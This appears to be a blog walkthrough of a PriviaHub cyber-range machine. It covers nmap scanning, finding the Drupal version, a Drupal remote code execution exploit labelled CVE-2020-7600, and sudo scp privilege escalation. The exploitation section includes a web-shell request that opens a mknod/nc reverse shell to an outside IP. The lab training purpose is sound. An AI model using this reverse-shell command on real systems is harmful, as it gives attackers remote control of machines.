---
title: "PriviaHub Bead Walkthourgh"
date: 2020-09-30 14:21 +0800
categories: [PriviaHub, Linux]
tags: [Drupal, CVE-2020-7600, scp]
author: CEngover
---

In this article we’re going to solve a vulnerable machine from [PriviaHub](https://app.priviahub.com/) Cyber Range Portal. Steps of the solution has described in below.

### Reconnaissance

- Nmap Scanning
- Finding exact version of Drupal
- Searching for exploit that belongs to version of Drupal

### Exploitation

- Exploitation with CVE-2020-7600
- Getting reverse shell

### Privilege Escalation

- Abuse of scp binary

## Reconnaissance

> The machine IP is 172.16.5.111 

As always we do I started with nmap scanning. I noticed that there are 2 open ports on the machine by running command that given in below.

> nmap -sC -sV 172.16.5.111 -oA nmap/bead-open-ports

![Markdowm Image][1]

As a result of scanning, OpenSSH service is running on port 22 and http service is running on port 80. Also it’s clear that there are several directory and files I can reach. 

![Markdowm Image][2]

When I visit the web page by following 80 port, I realised this web page is Drupal content management system. The scenario to be done came to my mind. I had to find a vulnerability about Drupal but there is a problem. I didn’t know what is the exact version of drupal.

![Markdowm Image][3]

Firstly, I ran whatweb tool and saw that what kind of technologies are using by the web site. It says that drupal has 7th version but that’s not enough. I have to find out which exact version does drupal have?

![Markdowm Image][4]

After a little bit reconnaissance, CHANGELOG.txt gave me what I need, the version. 

## Exploitation

![Markdowm Image][5]

It’s time to googling. I found a remote code execution vulnerability that drupal affected. This vulnerability has been published in exploitdb with CVE-2020-7600 code. Shortly, this exploit uploads a web shell to vulnerable system and gives us a terminal shell. I needed to upgrade my shell via reverse shell connection. This part was so hard for me because I tried many method but I couldn’t run my reverse shell payloads. After spending long time on google, I found a reverse shell payload that is making by mknod command.

![Markdowm Image][6]

I set up a listener on port 1337 and sent a reverse connection from web shell with

> http://172.16.5.111/sites/default/files/shell.php?c=mknod 0</tmp/backpipe p;/bin/sh /tmp/backpipe|nc 192.100.0.48 1337 1>/tmp/backpipe

## Privilege Escalataion

Now I have real shell and I’m rain user on the system. 

![Markdowm Image][7]

For privilege escalation I checked that is there any binary can I use with sudo rights? As a result, I saw that I can use /bin/scp command with no required password. I think, GTFObins is the best place where we can find exploitable binaries. As you see in the picture, I followed the steps and got root rights.

[1]: /assets/img/posts/bead/nmap.png
[2]: /assets/img/posts/bead/drupal.png
[3]: /assets/img/posts/bead/whatweb.png
[4]: /assets/img/posts/bead/version.png
[5]: /assets/img/posts/bead/exploit.png
[6]: /assets/img/posts/bead/shell.png
[7]: /assets/img/posts/bead/root.png
